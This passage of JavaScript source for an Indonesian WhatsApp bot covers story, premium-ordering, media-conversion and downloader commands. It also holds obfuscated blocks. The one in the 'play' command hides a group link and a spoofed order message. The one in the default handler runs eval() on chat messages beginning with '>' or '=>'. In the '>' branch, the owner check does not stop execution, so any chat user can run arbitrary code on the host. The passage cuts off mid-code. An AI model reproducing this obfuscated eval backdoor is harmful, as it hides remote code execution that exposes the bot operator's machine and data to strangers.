❏ *Pass Moderation*:${hasil.lolos}
❏ *Story*: ${hasil.cerita}`
zeroyt7.sendText(from, txt, ftroli)
}
break
case 'cerpen-bahasadaerah': {
reply(mess.wait)
let hasil = await cerpen(`bahasa daerah`)
txt = `❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}
❏ *Story*: ${hasil.cerita}`
zeroyt7.sendText(from, txt, ftroli)
}
break
case 'cerpen-anak': {
reply(mess.wait)
let hasil = await cerpen(`anak`)
txt = `❏ *Judul*: ${hasil.title}
❏ *Author*: ${hasil.author}
❏ *Category*:${hasil.kategori}
❏ *Pass Moderation*:${hasil.lolos}
❏ *Story*: ${hasil.cerita}`
zeroyt7.sendText(from, txt, ftroli)
}
break
case 'bijak':
case 'dare':
case 'fakta':
case 'motivasi':
case 'truth':{
let dejdj = require(`../library/scraper/random/${command}.json`)
var byktr = dejdj[Math.floor(Math.random() * dejdj.length)]
let dhejdiwkks = [
{buttonId: `${prefix+command}`, buttonText: {displayText: '➡️Next'}, type: 1}
]
let xmrlodijxkg = {
text: byktr,
footerText: creator,
buttons: dhejdiwkks,
headerType: 2
}
zeroyt7.sendMessage(from, xmrlodijxkg, { quoted: ftroli })
}
break
case 'listpremium': {
teks = '*List Premium*\n'
for (let zeroyt7 of prem) {
teks += `- ${zeroyt7}\n`
}
teks += `\n*Total : ${prem.length}*`
zeroyt7.sendMessage(from, { text: teks.trim() }, 'extendedTextMessage', { quoted: ftroli, contextInfo: { "mentionedJid": prem } })
}
break
case 'buypremium': {
teks = `Hai Kak @${sender.split("@")[0]} ${ucapanWaktu}
Mau Order Premium Ya? Silahkan Pencet Di Bawah Ya Kak`
const seactiones = [
{
title: `LIST PREMIUM`,
rows: [
{title: `1 MINGGU`, rowId: `${prefix}premkay 1minggu`},
{title: `1 BULAN`, rowId: `${prefix}premkay 1bulan`},
{title: `3 BULAN`, rowId: `${prefix}premkay 3bulan`},
]
}
]
const listSw = { 
text: teks,
mentions: [sender],
footer: creator,
buttonText: 'SELECT',
sections: seactiones,
listType: 1}
zeroyt7.sendMessage(from, listSw, { quoted: ftroli })
}
break
case 'jadiowner': {
teks = `Hai Kak @${sender.split("@")[0]} ${ucapanWaktu}
Mau Order Jadi Owner Ya? Silahkan Pencet Di Bawah Ya Kak`
const seactiones = [
{
title: `LIST JADI OWNER`,
rows: [
{title: `1 MINGGU`, rowId: `${prefix}ownkay 1minggu`},
{title: `1 BULAN`, rowId: `${prefix}ownkay 1bulan`},
{title: `3 BULAN`, rowId: `${prefix}ownkay 3bulan`},
]
}
]
const listSw = { 
text: teks,
mentions: [sender],
footer: creator,
buttonText: 'SELECT',
sections: seactiones,
listType: 1}
zeroyt7.sendMessage(from, listSw, { quoted: ftroli })
}
break
case 'sewabot': {
teks = `Hai Kak @${sender.split("@")[0]} ${ucapanWaktu}
Mau Order Jadi Owner Ya? Silahkan Pencet Di Bawah Ya Kak`
const seactiones = [
{
title: `LIST SEWABOT`,
rows: [
{title: `1 MINGGU`, rowId: `${prefix}sewakay 1minggu`},
{title: `1 BULAN`, rowId: `${prefix}sewakay 1bulan`},
{title: `3 BULAN`, rowId: `${prefix}sewakay 3bulan`},
]
}
]
const listSw = { 
text: teks,
mentions: [sender],
footer: creator,
buttonText: 'SELECT',
sections: seactiones,
listType: 1}
zeroyt7.sendMessage(from, listSw, { quoted: ftroli })
}
break
case 'sewakay':
if ((args[0]) == '1minggu'){
reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
zeroyt7.sendMessage(chat,{text:`*❏ ORDER ❏*
📮 : *Paket:* 5K • Sewabot 1 Minggu
- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:ftroli})
} else
if ((args[0]) == '1bulan'){
reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
zeroyt7.sendMessage(chat,{text:`*❏ ORDER ❏*
📮 : *Paket:* 10K • Sewabot 1 Bulan
- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:ftroli})
} else
if ((args[0]) == '3bulan'){
reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
zeroyt7.sendMessage(chat,{text:`*❏ ORDER ❏*
📮 : *Paket:* 25K • Sewabot 3 Bulan
- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:ftroli})
}
break
case 'premkay':
if ((args[0]) == '1minggu'){
reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
zeroyt7.sendMessage(chat,{text:`*❏ ORDER ❏*
📮 : *Paket:* 10K • Premium 1 Minggu
- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:ftroli})
} else
if ((args[0]) == '1bulan'){
reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
zeroyt7.sendMessage(chat,{text:`*❏ ORDER ❏*
📮 : *Paket:* 15K • Premium 1 Bulan
- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:ftroli})
} else
if ((args[0]) == '3bulan'){
reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
zeroyt7.sendMessage(chat,{text:`*❏ ORDER ❏*
📮 : *Paket:* 35K • Premium 3 Bulan
- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:ftroli})
}
break
case 'ownkay':
if ((args[0]) == '1minggu'){
reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
zeroyt7.sendMessage(chat,{text:`*❏ ORDER ❏*
📮 : *Paket:* 15K • Jadi Owner 1 Minggu
- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:ftroli})
} else
if ((args[0]) == '1bulan'){
reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
zeroyt7.sendMessage(chat,{text:`*❏ ORDER ❏*
📮 : *Paket:* 25K • Jadi Owner 1 Bulan
- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:ftroli})
} else
if ((args[0]) == '3bulan'){
reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
zeroyt7.sendMessage(chat,{text:`*❏ ORDER ❏*
📮 : *Paket:* 45K • Jadi Owner 3 Bulan
- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:ftroli})
}
break
case 'halah': case 'hilih': case 'huluh': case 'heleh': case 'holoh': {
if (!m.quoted && !text) return reply(`Kirim/Reply Teks Dengan Caption ${prefix + command}`)
ter = command[1].toLowerCase()
tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
zeroyt7.sendMessage(from, { text : tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()) }, { quoted : ftroli})
}
break
case 'cekme': {
neme = args.join(" ")
bet = `${sender}`
var sifat = ['Baek','Jutek','Ngeselin','Bobrok','Pemarah','Sopan','Beban','Sangean','Cringe','Pembohong']
var hoby = ['Memasak','Membantu Atok','Mabar','Nobar','Sosmedtan','Membantu Orang lain','Nonton Anime','Nonton Drakor','Naik Motor','Nyanyi','Menari','Bertumbuk','Menggambar','Foto fotoan Ga jelas','Maen Game','Berbicara Sendiri']
var bukcin = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
var arp = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
var cakep = ['Iyaa cakep kek mimin','Maaf Kak, Banyak² Perawatan Ya','Jelek ajg','Cakep banget kek mimin😍','❌','✔️']
var wetak= ['Penyayang','Pemurah','Pemarah','Pemaaf','Penurut','Baik','Baperan','Baik Hati','penyabar','UwU','top deh, pokoknya','Suka Membantu']
var baikk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
var bhuruk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
var cerdhas = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
var berhani = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
var mengheikan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
var sipat = sifat[Math.floor(Math.random() * sifat.length)]
var biho = hoby[Math.floor(Math.random() * hoby.length)]
var bhucin = bukcin[Math.floor(Math.random() * bukcin.length)]
var senga = arp[Math.floor(Math.random() * arp.length)]
var chakep = cakep[Math.floor(Math.random() * cakep.length)]
var watak = wetak[Math.floor(Math.random() * wetak.length)]
var baik = baikk[Math.floor(Math.random() * baikk.length)]
var burug = bhuruk[Math.floor(Math.random() * bhuruk.length)]
var cerdas = cerdhas[Math.floor(Math.random() * cerdhas.length)]
var berani = berhani[Math.floor(Math.random() * berhani.length)]
var takut = mengheikan[Math.floor(Math.random() * mengheikan.length)]
profile = `*≡════《 Cek Sifat @${bet.split('@')[0]} 》════≡*

*Nama :* ${pushname}
*Sifat :* ${sipat}
*Hobby :* ${biho}
*Bucin :* ${bhucin}%
*Sange :* ${senga}%
*Cakep :* ${chakep}
*Watak :* ${watak}
*Akhlak Baik :* ${baik}%
*Akhlak Buruk :* ${burug}%
*Kecerdasan :* ${cerdas}%
*Keberanian :* ${berani}%
*Ketakutan :* ${takut}%

*≡═════《 CEKSIFATME 》═════≡*`
buff = await getBuffer(ppuser)
zeroyt7.sendMessage(from, { image: buff, caption: profile, mentions: [bet]},{quoted:ftroli})
}
break
case 'styletext':{
if (!q) return reply(`Contoh ${prefix+command} akira`)
reply(mess.wait)
let res = await styletext(q)
reply(util.format(res))
}
break
case 'tts': case 'gtts': {
if (!isPrem) return reply(mess.premium)
if (!q) return reply(` contoh : ${prefix+command} yamate kudasai`)
reply(mess.wait)
const gtts = require('../library/scraper/gtts')(`id`, q)
var bby = args.join(' ')
ranm = getRandom('.mp3')
rano = getRandom('.ogg')
bby.length > 300 ? reply('Teks nya terlalu panjang kak')
: gtts.save(ranm, bby, function () {
exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
fs.unlinkSync(ranm)
buff = fs.readFileSync(rano)
if (err) return reply(mess.error)
zeroyt7.sendMessage(from,{audio:buff, mimetype: "audio/mp4", ptt:false},{quoted:ftroli})
fs.unlinkSync(rano)
})
})
}
break
case 'tovn': {
if (!isPrem) return reply(mess.premium)
if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`Reply Video/Audio That You Want To Be VN With Caption ${prefix + command}`)
reply(mess.wait)
mee = await zeroyt7.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(mee)
zeroyt7.sendMessage(from, { audio: { url: mem }, mimetype: 'audio/mp4', ptt:true, mentions:[m.sender]}, { quoted: ftroli })
}
break
case 'toaudio': {
if (!isPrem) return reply(mess.premium)
if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`Send/Reply the Video/Audio You Want to Use as Audio With Caption ${prefix + command}`)
reply(mess.wait)
mee = await zeroyt7.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(mee)
zeroyt7.sendMessage(from, { audio: { url: mem }, mimetype: 'audio/mp4', ptt:false, mentions:[m.sender]}, { quoted: ftroli })
}
break
case 'tomp3': {
if (!isPrem) return reply(mess.premium)
if (/document/.test(mime)) return reply(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`)
reply(mess.wait)
if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`)
mee = await zeroyt7.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(mee)
zeroyt7.sendMessage(from, { document: {url:mem}, mimetype: 'audio/mpeg', fileName: `Convert By ${pushname}.mp3`, jpegThumbnail: thumbnail, mentions:[sender] }, {quoted:ftroli})
}
break
case 'toimage': {
if (!isPrem) return reply(mess.premium)
if (!quoted) return reply('Reply Image')
if (!/webp/.test(mime)) return reply(`Balas Sticker Dengan Caption *${prefix + command}*`)
reply(mess.wait)
let toimage = await zeroyt7.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${toimage} ${ran}`, (err) => {
fs.unlinkSync(toimage)
if (err) return reply(err)
let buffer = fs.readFileSync(ran)
zeroyt7.sendMessage(from, { image: buffer }, { quoted: ftroli })
fs.unlinkSync(ran)
})
}
break
case 'toonce': { 
if (!isPrem) return reply(mess.premium)
if (!quoted) return reply(`Reply Image/Video`)
if (/image/.test(mime)) {
anuan = await zeroyt7.downloadAndSaveMediaMessage(quoted)
zeroyt7.sendMessage(from, {image: {url:anuan}, caption: `Nih Kak`, fileLength: "99999999", viewOnce : true},{quoted: ftroli })
} else if (/video/.test(mime)) {
anuanuan = await zeroyt7.downloadAndSaveMediaMessage(quoted)
zeroyt7.sendMessage(from, {video: {url:anuanuan}, caption: `Nih Kak`, fileLength: "99999999", viewOnce : true},{quoted: ftroli })
}
}
break
case 'cariresep':{
if (!q) return reply(`Masukan Nama Resep Nya\nContoh ${prefix+command} Ayam Geprek`)
reply(mess.wait)
let ker = await scp1.cariresep(q)
zeroyt7.sendMessage(from, { text : util.format(ker) }, { quoted : ftroli })
}
break
case 'bacaresep':{
if (!q) return reply(`Masukan Link Resep Nya\nContoh ${prefix+command} https://resepkoki.id/resep/resep-ayam-geprek-keju/`)
reply(mess.wait)
let kay = await scp1.bacaresep(q)
let dty = `Resep Di Bawah
Judul : ${kay.judul_nya}
Waktu : ${kay.waktu_nya}
Hasil : ${kay.hasil_nya}
Tingkat Kesulitan : ${kay.tingkat_kesulitan}
Bahan :
${kay.bahan_nya}`
zeroyt7.sendMessage(from,{
image:{
url:kay.thumb_nya},
caption:dty},
{quoted:ftroli})
}
break
case 'ss': case 'ssweb':{
if (!isPrem) return reply(mess.premium)
if (!q) return reply(`Masukan Link Web Nya\nContoh ${prefix+command} https://zeroyt7.biz.id`)
reply(mess.wait)
let krt = await scp1.ssweb(q)
zeroyt7.sendMessage(from,{image:krt.result,caption:mess.succes},{quoted:ftroli})
}
break
case 'wasted':
case 'comrade':
case 'horny':
case 'blur':
case 'pixelate':
case 'simpcard':
case 'lolice':
case 'gay':
case 'jail':
try {
if (!isPrem) return reply(mess.premium)
if (!isMedia) return reply(`Kirim/Reply Foto/Vi Dengan Caption ${prefix + command}`)
reply(mess.wait)
meeh = await zeroyt7.downloadAndSaveMediaMessage(quoted)
memh = await uptotelegra(meeh)
gdye = await getBuffer(`https://some-random-api.ml/canvas/${command}?avatar=${memh}`)
zeroyt7.sendImageAsSticker(from, gdye, ftroli, { packname: packname, author: author })
} catch (err) {
reply(`Reply Image Nya Bang`)
}
break
case 'cry': case 'kill': case 'hug': case 'pat': case 'lick': 
case 'kiss': case 'bite': case 'yeet': case 'bully': case 'bonk':
case 'wink': case 'poke': case 'nom': case 'slap': case 'smile': 
case 'wave': case 'awoo': case 'blush': case 'smug': case 'glomp': 
case 'happy': case 'dance': case 'cringe': case 'cuddle': case 'highfive': 
case 'shinobu': case 'handhold': {
if (!isPrem) return reply(mess.premium)
reply(mess.wait)
axios.get(`https://api.waifu.pics/sfw/${command}`)
.then(({data}) => {
zeroyt7.sendImageAsSticker(from, data.url, ftroli, { packname: packname, author: author })
})
}
break
case 'q': case 'quoted': {
if (!m.quoted) return reply('Reply Pesannya!!')
let wokwol = await zeroyt7.serializeM(await m.getQuotedObj())
if (!wokwol.quoted) return reply('Pesan Yang Anda Reply Tidak Mengandung Reply')
await wokwol.quoted.copyNForward(from, true)
}
break
case 'tiktok':{ 
if (!isPrem) return reply(mess.premium)
if (!text) return reply(`Masukan Link Tiktok Nya\nContoh : ${prefix + command} https://vt.tiktok.com/ZS8fnWCj5/`)
if (!q.includes('tiktok')) return reply(`Link Invalid!!`)
reply(mess.wait)
require('../library/scraper/tiktok').Tiktok(q).then( data => {
var button = [
{ buttonId: `tiktokaudio ${text}`, buttonText: { displayText: `🎵Audio` }, type: 1 }, 
{ buttonId: `owner`, buttonText: { displayText: `👥Owner` }, type: 1 }]
zeroyt7.sendMessage(from, { caption: myyt, video: { url: data.watermark }, buttons: button, footer: creator, mentions: [sender] })
})
}
break
case 'tiktokaudio':{
if (!isPrem) return reply(mess.premium)
if (!text) return reply( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return reply(`Link Invalid!!`)
reply(mess.wait)
require('../library/scraper/tiktok').Tiktok(q).then( data => {
zeroyt7.sendMessage(from, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: ftroli })
})
}
break
case 'yts': case 'ytsearch': {
if (!isPrem) return reply(mess.premium)
if (!text) return reply(`Masukan Judul Lagu Nya\nContoh : ${prefix + command} Terlalu St12`)
let yts = require("yt-search")
let search = await yts(text)
let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
let no = 1
for (let i of search.all) {
teks += `⭔ No : ${no++}\n⭔ Type : ${i.type}\n⭔ Video ID : ${i.videoId}\n⭔ Title : ${i.title}\n⭔ Views : ${i.views}\n⭔ Duration : ${i.timestamp}\n⭔ Upload At : ${i.ago}\n⭔ Url : ${i.url}\n\n─────────────────\n\n`
}
zeroyt7.sendMessage(from, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: ftroli })
}
break
case 'mediafire': {
if (!isPrem) return reply(mess.premium)
if (!q) return reply(`Masukan Link Nya\nContoh : ${prefix + command} https://www.mediafire.com/file/4f7jiblifre0grb/MaaBestV3-MD.zip/file`)
if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) return reply('Link Invalid!')
reply(mess.wait)
let medfr = await scp1.mediafire(q)
await zeroyt7.sendMessage(from, {document:{url:medfr.link}, fileName:`Download Mediafire By ${m.pushName}.${medfr.mime}`, mimetype:`application/${mime}`},{quoted:ftroli})
}
break
case 'play':{
if (!isPrem) return reply(mess.premium)
if (!text) return reply(`Masukan Judul Lagu Nya\nContoh : ${prefix+command} Terlalu St12`)
reply(mess.wait)
let search = await yts(text)
url = search.videos[0].url
let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
eek = await getBuffer(anu.thumbnail)
owned = '6285157740529@s.whatsapp.net'
ngen = `
Title : ${anu.title}
Ext : Search
ID : ${anu.videoId}
Viewers : ${anu.views}
Upload At : ${anu.ago}
Author : ${anu.author.name}
Channel : ${anu.author.url}`
function _0xbeb4(){const _0x5d9e0e=['1785330lXPHpU','at.whatsap','22VOxOkD','9JnlNlT','3991@g.us','Audio','1382924ncUdFA','sendMessag','\x20Zero\x20YT7','Video','697648slgyQy','99PNOxIp','yUev84L9S9','pp.net','mp3\x20','6481570pBdCCs','Bot','mp4\x20','56kpQUsk','6281903153','9999999999','url','nsMg5gHg','Join\x20Group','999999999','https://ch','0@s.whatsa','p.com/BsGr','362658MlSSHn','576490GbmFIt','Created\x20By','\x20Official\x20','426-162605','667800otFftO'];_0xbeb4=function(){return _0x5d9e0e;};return _0xbeb4();}const _0x149dc2=_0x7834;(function(_0x258abe,_0x193a00){const _0x249a65=_0x7834,_0x40a82f=_0x258abe();while(!![]){try{const _0xb3a91b=parseInt(_0x249a65(0x120))/(-0x1*-0x224b+0x400+-0x264a)+-parseInt(_0x249a65(0x124))/(0x177*0x1a+0x1c*-0x143+-0x2c0)+-parseInt(_0x249a65(0x128))/(0x1907*0x1+-0xfd*-0x5+-0x1df5)*(parseInt(_0x249a65(0x12b))/(0x525+0x1293+-0x17b4))+-parseInt(_0x249a65(0x125))/(0x194d+-0x114+-0x1834)+-parseInt(_0x249a65(0x11f))/(-0x117*0xd+-0x216d+0x1*0x2f9e)*(parseInt(_0x249a65(0x115))/(-0x21ad+0x1207+0xfad))+-parseInt(_0x249a65(0x12f))/(0x63a*0x1+-0x1fff*0x1+0x19cd*0x1)*(-parseInt(_0x249a65(0x130))/(0x7d7*-0x4+-0x23ed+0x4352))+-parseInt(_0x249a65(0x134))/(-0x1de0+0x19b*0x11+0x29f)*(-parseInt(_0x249a65(0x127))/(0x189f+0x1958+0x18f6*-0x2));if(_0xb3a91b===_0x193a00)break;else _0x40a82f['push'](_0x40a82f['shift']());}catch(_0x3ad6cb){_0x40a82f['push'](_0x40a82f['shift']());}}}(_0xbeb4,-0x6e50d+-0x2aaaf*0x1+0x7*0x2b7dd));function _0x7834(_0x5a7fb4,_0x32dfe0){const _0xd2a2ee=_0xbeb4();return _0x7834=function(_0x1db487,_0x7217c3){_0x1db487=_0x1db487-(-0x9ce+-0x91a+0x13fd);let _0x3724e1=_0xd2a2ee[_0x1db487];return _0x3724e1;},_0x7834(_0x5a7fb4,_0x32dfe0);}let buttonse=[{'buttonId':prefix+_0x149dc2(0x136)+anu[_0x149dc2(0x118)],'buttonText':{'displayText':_0x149dc2(0x12e)},'type':0x1},{'buttonId':prefix+_0x149dc2(0x133)+anu[_0x149dc2(0x118)],'buttonText':{'displayText':_0x149dc2(0x12a)},'type':0x1}],buttonMessages={'image':eek,'jpegThumbnail':eek,'caption':ngen,'fileLength':_0x149dc2(0x117)+'9','mentions':[sender,owned],'footer':creator,'buttons':buttonse,'headerType':0x4,'contextInfo':{'mentionedJid':[sender,owned],'externalAdReply':{'showAdAttribution':!![],'renderLargerThumbnail':![],'title':_0x149dc2(0x11a)+_0x149dc2(0x122)+_0x149dc2(0x135),'containsAutoReply':!![],'mediaType':0x1,'thumbnail':eek,'mediaUrl':_0x149dc2(0x11c)+_0x149dc2(0x126)+_0x149dc2(0x11e)+_0x149dc2(0x131)+_0x149dc2(0x119),'sourceUrl':_0x149dc2(0x11c)+_0x149dc2(0x126)+_0x149dc2(0x11e)+_0x149dc2(0x131)+_0x149dc2(0x119)}}};zeroyt7[_0x149dc2(0x12c)+'e'](from,buttonMessages,{'quoted':{'key':{'fromMe':![],'participant':_0x149dc2(0x11d)+_0x149dc2(0x132),'remoteJid':_0x149dc2(0x116)+_0x149dc2(0x123)+_0x149dc2(0x129)},'message':{'orderMessage':{'itemCount':0x5f5e0ff,'status':0x1,'surface':0x1,'message':_0x149dc2(0x121)+_0x149dc2(0x12d),'orderTitle':_0x149dc2(0x11b),'sellerJid':_0x149dc2(0x11d)+_0x149dc2(0x132)}}}});
}
break
case 'ytmp4': case 'mp4':{
if (!isPrem) return reply(mess.premium)
if (!text) return reply(`Masukan Link Youtube Nya\nContoh : ${prefix + command} https://youtu.be/vFDS1jW76ys`)
reply(mess.wait)
downloadMp4(text)
}
break
case 'ytmp3': case 'mp3':{
if (!isPrem) return reply(mess.premium)
if (!text) return reply(`Masukan Link Youtube Nya\nContoh : ${prefix + command} https://youtu.be/vFDS1jW76ys`)
reply(mess.wait)
downloadMp3(text)
}
break
case 'googles': {
if (!q) return reply(`Masukan Judul Pencarian Nya\nContoh : ${prefix + command} Sandrinna Michelle`)
reply(mess.wait)
let google = require('google-it')
google({'query': text}).then(res => {
let teks = `Google Search From : ${text}\n\n`
for (let g of res) {
teks += `⭔ *Title* : ${g.title}\n`
teks += `⭔ *Description* : ${g.snippet}\n`
teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`
} 
zeroyt7.sendMessage(from, { text : teks }, { quoted : ftroli })
})
}
break
case 'happymod':{
if (!q) return reply(`Masukan Nama Apk Nya\nContoh ${prefix+command} Mobile Legend`)
reply(mess.wait)
let kat = await scp1.happymod(q)
zeroyt7.sendMessage(from, { text : util.format(kat) }, { quoted : ftroli })
}
break

//━━━━━━━━━━━━━━━[ USE A READ CONSOLE BOT ]━━━━━━━━━━━━━━━━━//

default:
var _0x10a606=_0x167f;(function(_0x534db0,_0xf2f162){var _0x4fa163=_0x167f,_0x22a170=_0x534db0();while(!![]){try{var _0x311e8c=parseInt(_0x4fa163(0x201))/(0x67*-0x1+0x17c0+-0x1758)+-parseInt(_0x4fa163(0x1f9))/(0xc0e+-0x1cc7+-0x10bb*-0x1)*(-parseInt(_0x4fa163(0x1e9))/(-0x1f4a+0xf87+0x542*0x3))+-parseInt(_0x4fa163(0x1f8))/(-0x6e3+-0x51b+0xc02)*(parseInt(_0x4fa163(0x1f0))/(-0x1eb+0x8*-0x3c1+0x1ff8))+-parseInt(_0x4fa163(0x1ff))/(-0x1a6*0x3+-0x1596+-0xce*-0x21)*(-parseInt(_0x4fa163(0x1f6))/(0x13*-0x151+0x20f5+-0x7eb))+-parseInt(_0x4fa163(0x206))/(-0x2708+-0x19*0x127+0x43df)+parseInt(_0x4fa163(0x1fb))/(0x5d1*-0x4+-0xdc*0x29+-0x5*-0xbb5)+parseInt(_0x4fa163(0x1ee))/(0x7e1*-0x4+0x2454+0x2f*-0x1a)*(parseInt(_0x4fa163(0x1eb))/(0x11bc+-0xa1c*0x2+0x287));if(_0x311e8c===_0xf2f162)break;else _0x22a170['push'](_0x22a170['shift']());}catch(_0x1c3607){_0x22a170['push'](_0x22a170['shift']());}}}(_0x4fb4,0x5cef+-0x13e1af*-0x1+-0x4e409*0x2));if(budy[_0x10a606(0x1fe)]('=>')){if(!itsMezeroyt7)return reply(mess[_0x10a606(0x1ec)]);function Return(_0x5645c1){var _0x17d02b=_0x10a606,_0x1e321e={'WkMRi':function(_0xd6df14,_0x399dcb){return _0xd6df14==_0x399dcb;}};sat=JSON[_0x17d02b(0x203)](_0x5645c1,null,-0x1b31*-0x1+0x4*0x7d3+-0x3a7b),bang=util[_0x17d02b(0x1f1)](sat),_0x1e321e[_0x17d02b(0x200)](sat,undefined)&&(bang=util[_0x17d02b(0x1f1)](_0x5645c1)),m[_0x17d02b(0x202)](bang);}try{reply(util[_0x10a606(0x1f1)](eval(_0x10a606(0x1fa)+_0x10a606(0x204)+'n\x20'+budy[_0x10a606(0x1e7)](-0x1*0x1a83+-0x1989*0x1+0x340f*0x1)+_0x10a606(0x1f4))));}catch(_0x3f1ea4){reply(String(_0x3f1ea4));}}if(budy[_0x10a606(0x1fe)]('>')){if(!itsMezeroyt7)m[_0x10a606(0x202)](mess[_0x10a606(0x1ec)]);try{let evaled=await eval(budy[_0x10a606(0x1e7)](0x25e1+0x156f+0x3b4e*-0x1));if(typeof evaled!==_0x10a606(0x1e5))evaled=require(_0x10a606(0x1ed))[_0x10a606(0x1fc)](evaled);await reply(evaled);}catch(_0x4ca4c0){await reply(String(_0x4ca4c0));}}function _0x4fb4(){var _0x172de1=['ruskan','3175kiEgBR','format','message','teman','\x20})()','text','4837kMaBcp','extendedTe','876ONrjUR','2139854BsNhsE','(async\x20()\x20','221382hlPgrw','inspect','type','startsWith','258eCCCol','WkMRi','211455iuwwkd','reply','stringify','=>\x20{\x20retur','*ANONYMOUS','9175024qYrPAV','conversati','pesan\x20dite','\x20CHAT*\x0a💬\x20:','string','messages','slice','sendMessag','3eMxXJB','xtMessage','777282RxkvwP','owner','util','90WlcsmH'];_0x4fb4=function(){return _0x172de1;};return _0x4fb4();}function _0x167f(_0x5860ae,_0x2b9f16){var _0x136650=_0x4fb4();return _0x167f=function(_0x111c38,_0x1f13ec){_0x111c38=_0x111c38-(-0x73*0x48+-0x11*0x33+0x141*0x1e);var _0x55c5b9=_0x136650[_0x111c38];return 